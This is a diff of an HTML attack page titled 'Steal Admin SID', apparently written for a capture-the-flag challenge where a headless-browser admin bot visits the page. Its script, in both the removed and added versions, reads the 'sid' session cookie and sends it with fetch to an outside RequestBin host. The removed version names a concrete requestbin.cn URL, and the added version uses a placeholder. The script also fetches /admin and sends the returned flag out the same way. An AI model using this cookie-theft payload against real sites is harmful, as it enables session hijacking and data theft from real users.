@@ -1,19 +1,44 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Steal Admin SID</title>
+</head>
 <body>
 <script>
-  // 读取admin的sid Cookie（HttpOnly=false，可读取）
-  const sid = document.cookie.match(/sid=([^;]+)/)?.[1] || 'no_sid';
-  // 构造请求地址，将sid拼接到URL参数中
-  const attackerUrl = 'http://www.requestbin.cn:80/1fn11tu1?sid=' + encodeURIComponent(sid);
-  // 发送GET请求，将sid发送到攻击者的RequestBin
-  fetch(attackerUrl, { method: 'GET', mode: 'no-cors' });
+    // 核心1：读取document.cookie中的sid（适配sid在cookie中的格式：sid=xxx; 其他键=xxx）
+    function getAdminSid() {
+        const cookies = document.cookie.split('; ');
+        for (let cookie of cookies) {
+            const [key, value] = cookie.split('=');
+            if (key === 'sid') {
+                return value; // 提取纯sid值，去掉多余字符
+            }
+        }
+        return 'sid_not_found'; // 容错：未读取到sid时返回标识
+    }
 
-  // 额外：直接访问/admin接口，将FLAG也发送到RequestBin（一步到位）
-  fetch('/admin').then(res => res.json()).then(data => {
-    const flag = data.flag || 'no_flag';
-    fetch('http://www.requestbin.cn:80/1fn11tu1?sid=' + encodeURIComponent(sid) + '&flag=' + encodeURIComponent(flag), { method: 'GET', mode: 'no-cors' });
-  });
+    // 核心2：获取sid并发送到攻击者的RequestBin
+    const adminSid = getAdminSid();
+    const attackerUrl = `【你的RequestBin地址】?admin_sid=${encodeURIComponent(adminSid)}`;
+    // 发送GET请求，将sid拼接到URL参数，无跨域限制
+    fetch(attackerUrl, {
+        method: 'GET',
+        mode: 'no-cors', // 关键：避免Puppeteer报跨域错误
+        cache: 'no-cache'
+    });
+
+    // 额外：同时尝试直接访问/admin拿FLAG，一步到位（可选，不影响sid窃取）
+    fetch('/admin', {mode: 'no-cors'})
+        .then(res => res.text().catch(() => 'no_flag'))
+        .then(flag => {
+            if (flag !== 'no_flag') {
+                fetch(`【你的RequestBin地址】?admin_sid=${encodeURIComponent(adminSid)}&flag=${encodeURIComponent(flag)}`, {
+                    method: 'GET',
+                    mode: 'no-cors'
+                });
+            }
+        });
 </script>
 </body>
 </html>
